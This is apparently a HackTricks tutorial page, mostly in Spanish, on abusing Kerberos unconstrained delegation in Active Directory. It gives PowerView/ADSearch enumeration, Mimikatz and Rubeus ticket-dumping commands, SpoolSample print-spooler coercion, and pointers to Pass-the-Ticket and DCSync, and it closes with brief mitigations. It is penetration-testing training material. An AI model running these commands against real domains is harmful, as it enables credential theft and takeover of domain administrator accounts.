# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Esta es una característica que un Administrador de Dominio puede establecer en cualquier **Computadora** dentro del dominio. Luego, cada vez que un **usuario inicia sesión** en la Computadora, una **copia del TGT** de ese usuario será **enviada dentro del TGS** proporcionado por el DC **y guardada en memoria en LSASS**. Así que, si tienes privilegios de Administrador en la máquina, podrás **extraer los tickets e impersonar a los usuarios** en cualquier máquina.

Entonces, si un administrador de dominio inicia sesión en una Computadora con la característica de "Unconstrained Delegation" activada, y tú tienes privilegios de administrador local en esa máquina, podrás extraer el ticket e impersonar al Administrador de Dominio en cualquier lugar (domain privesc).

Puedes **encontrar objetos de Computadora con este atributo** verificando si el atributo [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) contiene [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Puedes hacer esto con un filtro LDAP de ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, que es lo que hace powerview:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Cargue el ticket del Administrador (o usuario víctima) en memoria con **Mimikatz** o **Rubeus para un** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Más información: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Más información sobre la delegación no restringida en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Forzar Autenticación**

Si un atacante puede **comprometer una computadora permitida para "Delegación No Restringida"**, podría **engañar** a un **servidor de impresión** para que **inicie sesión automáticamente** contra él **guardando un TGT** en la memoria del servidor.\
Luego, el atacante podría realizar un **ataque Pass the Ticket para suplantar** la cuenta de computadora del usuario del servidor de impresión.

Para hacer que un servidor de impresión inicie sesión contra cualquier máquina, puede usar [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Si el TGT proviene de un controlador de dominio, podrías realizar un [**ataque DCSync**](acl-persistence-abuse/index.html#dcsync) y obtener todos los hashes del DC.\
[**Más información sobre este ataque en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Encuentra aquí otras formas de **forzar una autenticación:**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Mitigación

- Limitar los inicios de sesión de DA/Admin a servicios específicos
- Establecer "La cuenta es sensible y no se puede delegar" para cuentas privilegiadas.

{{#include ../../banners/hacktricks-training.md}}
